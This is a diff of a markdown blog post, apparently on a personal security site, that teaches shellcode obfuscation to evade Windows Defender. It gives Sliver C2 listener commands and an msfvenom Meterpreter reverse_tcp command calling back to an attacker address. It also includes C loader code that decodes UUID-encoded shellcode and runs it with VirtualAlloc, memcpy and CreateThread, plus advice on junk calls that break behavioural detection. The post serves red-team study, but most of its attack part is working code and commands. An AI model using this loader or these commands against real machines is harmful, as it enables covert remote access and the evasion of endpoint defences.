@@ -78,13 +78,13 @@ The first step for the demonstration would be to create a shellcode. We will be 
 Setting up Sliver C2 is outside of this blog's objective. However, you can simply setup the Sliver C2 server and client following the [offical documentation of Sliver](https://sliver.sh/docs?name=Getting+Started).
 
 Once you have your sliver client ready and up running. Create a profile using below command:
-```
+```bash
 profiles new beacon --mtls 192.168.1.86:443 --format shellcode shellcode-beacon
 ```
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-6.png">
 
 Create a stager listener on port 8080. This listener delivers staged payloads and start the mTLS C2 server on host 192.168.1.86 and port 443.
-```
+```bash
 stage-listener -u tcp://192.168.1.86:8080 -p shellcode-beacon
 
 mtls -L 192.168.1.86 -l 443
@@ -95,17 +95,17 @@ The victim machine runs stager delivered through port 8080, receives the beacon 
 
 We can either use sliver **generate stager** command or msfvenom to generate our shellcode. For sliver stagers, it just call the msfvenom APIs, so there would be no difference on the shellcode.   
 **Using Sliver**
-```
+```bash
 generate stager --lhost 192.168.1.86 --lport 8080 --protocol http --save /tmp
 ```
 
 **Using msfvenom**
-```
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f raw -o /tmp/win-shellcode.bin
 ```
 
 ## Obfuscation using Supernova
-```
+```bash
 ./Supernova -obf UUID -input /tmp/win-shellcode.bin -lang C
 ```
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-9.png">
@@ -117,7 +117,7 @@ Until now, we have everything ready to listen and wait for the connection on the
  
 The shellcode which was converted into UUID was stored as an array on **UuidArray**. There are 32 numbers of UUID which is denoted by **NumberofElements**. Similarly, the code block containing **typedef RPC_STATUS** defines a function pointer type called **fnUuidFromStringA** which is a Windows RPC function for converting a UUID.
 
-```C
+```c
 char* UuidArray[] = {
         "E48348FC-E8F0-00CC-0000-415141505251", "56D23148-4865-528B-6048-8B5218488B52", "B70F4820-4A4A-314D-C948-8B72504831C0",
         "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "528B4852-4120-8B51-423C-4801D0668178", "0F020B18-7285-0000-008B-808800000048",
@@ -142,7 +142,7 @@ typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
 
 The method **UuidDeobfuscation** contains four arguments which are **UuidArray[], NmbrOfElements, ppDAddress and pDSize**, in which **UuidArray[]** contains the UUIDs i.e. obfuscated shellcode, **NmbrOfElements** contains the number of UUIDs on the array i.e. 32, **ppDAddress** provides the address of the deobfuscated shellcode and **pDSize** provides the total size of the shellcode.
 
-```C
+```c
 BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {
 
         PBYTE           pBuffer         = NULL,
@@ -154,7 +154,7 @@ BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE
 
 The code below loads **UuidFromStringA** method from **RPCRT4.dll** which is responsible for converting UUID strings to their original form. Using **GetProcAddress** and **LoadLibrary**, it will a pointer to **UuidFromStringA** function at runtime. If it false, the program exits.
 
-```C
+```c
         // getting UuidFromStringA   address from Rpcrt4.dll
         fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
         if (pUuidFromStringA == NULL) {
@@ -165,7 +165,7 @@ The code below loads **UuidFromStringA** method from **RPCRT4.dll** which is res
 
 The next step would be to calculating the original size of the shellcode and allocating a memory for containing the deobfuscated shellcode. Here since each UUID is 16 bytes, the total number of buffer needed to be allocated is **16 * NmbfOfElements**. Just think it as an storage for the deobfuscated code.
 
- ```C       
+ ```c       
         // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
         sBuffSize = NmbrOfElements * 16;
         
@@ -182,7 +182,7 @@ The next step would be to calculating the original size of the shellcode and all
 
 The loop below iterates over each UUID string within the input array **UuidArray** until the number of UUID are completed as it runs from **0** until **NmbrOfElements - 1**. With each loop, **pUuidFromStringA** is used to convert the UUID string into tis 16 byte binary representation. There is an increment on **TmpBuffer** as well which is increased by 16 bytes after each loop that points the next position in the allocated memory buffer about storing another converted 16 byte binary and so on.
 
-```C
+```c
         // loop through all the addresses saved in Ipv6Array
         for (int i = 0; i < NmbrOfElements; i++) {
                 // UuidArray[i] is a single UUid address from the array UuidArray
@@ -204,7 +204,7 @@ The loop below iterates over each UUID string within the input array **UuidArray
 
 Until now, we have the code which converts our obfuscated shellcode into the raw binary i.e. its original form. Next approach would be to use shellcode injection techniques to inject the de-obfuscated shellcode into the current process. 
 
-```C
+```c
 int main() {
         PBYTE pDeobfuscatedPayload = NULL;
         SIZE_T sDeobfuscatedSize = NULL;
@@ -214,7 +214,7 @@ int main() {
 ```
 
 Call **UuidDeobfuscation** method to deobfuscated payload. The argument **&pDeobfuscatedPayload** contains pointer to the starting address of the payload and **&sDeobfuscatedSize** contains the pointer to the size of the payload.
-```C
+```c
         // Payload Decryption
         printf("Decrypting the payload.");                                                                                                                                        if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
                 return -1;
@@ -222,7 +222,7 @@ Call **UuidDeobfuscation** method to deobfuscated payload. The argument **&pDeob
 ```
 
 Next step would be to use **VirtualAlloc** method to allocate the memory space for the deobfuscated payload. I have already explained about the **VirtualAlloc** [method here](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex).
-```C
+```c
         // Allocating memory the size of sDeobfuscatedSize
         // With memory permissions set to read and write so that we can write the payload later
         PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -235,7 +235,7 @@ Next step would be to use **VirtualAlloc** method to allocate the memory space f
 ```
 
 Once the memory has been allocated, we can either write buffer to the allocated memory using **WriteProcessMemory** methodor use **memcpy** to copy the payload into the allocate memory. As we have not defined the memory address to be executable during **VirtualAlloc** method, we need to set memory permisstions to be executable.
-```C
+```c
         memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
 
         // Cleaning the pDeobfuscatedPayload buffer, since it no longer needed
@@ -250,8 +250,9 @@ Once the memory has been allocated, we can either write buffer to the allocated 
         }
 ```
 
-Once the shellcode has been written into the buffer, we can execute that shellcode using a new thread. The **CreateThread** executes the shellcode available on **pShellcodeAddress**. If we are attacking remote process, **CreateRemoteThread** should be used instead. [More details on](https://nirajkharel.com.np/posts/process-injection-shellcode/#execute-the-shellcode---createremotethreadex).
-```C
+Once the shellcode has been written into the buffer, we can execute that shellcode using a new thread. The **CreateThread** executes the shellcode available on **pShellcodeAddress**. If we are attacking remote process, **CreateRemoteThread** should be used instead. [More details on](https://nirajkharel.com.np/posts/process-injection-shellcode/#execute-the-shellcode---createremotethreadex).    
+
+```c
         // Running the shellcode as a new thread's entry
         if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
                 printf("CreateThread Failed with error: %d \n", GetLastError());
@@ -267,9 +268,9 @@ Once the shellcode has been written into the buffer, we can execute that shellco
 }
 ```
 
-**Note:** Remember to insert some random methods withiin each of the above steps. This will help us to break the attack chain and can potentially bypass the Behavioural detection capabilities of the Windows Defender. For this demonstration, the below method for enumerating the username of the current machine has been inserted between each of the steps.
+**Note:** Remember to insert some random methods withiin each of the above steps. This will help us to break the attack chain and can potentially bypass the Behavioural detection capabilities of the Windows Defender. For this demonstration, the below method for enumerating the username of the current machine has been inserted between each of the steps.  
 
-```C
+```c
         // Breaking attack chain
         TCHAR username[UNLEN + 1];  // UNLEN is the max username length
         DWORD username_len = UNLEN + 1;
@@ -282,8 +283,9 @@ Once the shellcode has been written into the buffer, we can execute that shellco
         }
 ```
 
-This makes our full code as:
-```C
+This makes our full code as:    
+
+```c
 
 #include <Windows.h>
 #include <stdio.h>
@@ -446,7 +448,7 @@ int main() {
 
         return 0;
 }
-```
+``` 
 
 Build the malicious executable using Visual Studio.
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-11.png">
@@ -461,3 +463,8 @@ Execute the payload on the completely patched Windows 11 machine and observe tha
 ## Obfuscation using Nim
 
 #### References
+- [https://maldevacademy.com/](https://maldevacademy.com/)
+- [https://www.kylerosario.com/blog/IPObfuscation](https://www.kylerosario.com/blog/IPObfuscation)
+- [https://bishopfox.com/blog/passing-the-osep-exam-using-sliver](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver)
+- [https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8)
+- [https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/#:~:text=trigger%20an%20alert.-,Bypassing%20heuristic%20and%20behavioural%20detection,running%20in%20a%20sandbox%20environment.](https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/#:~:text=trigger%20an%20alert.-,Bypassing%20heuristic%20and%20behavioural%20detection,running%20in%20a%20sandbox%20environment.)
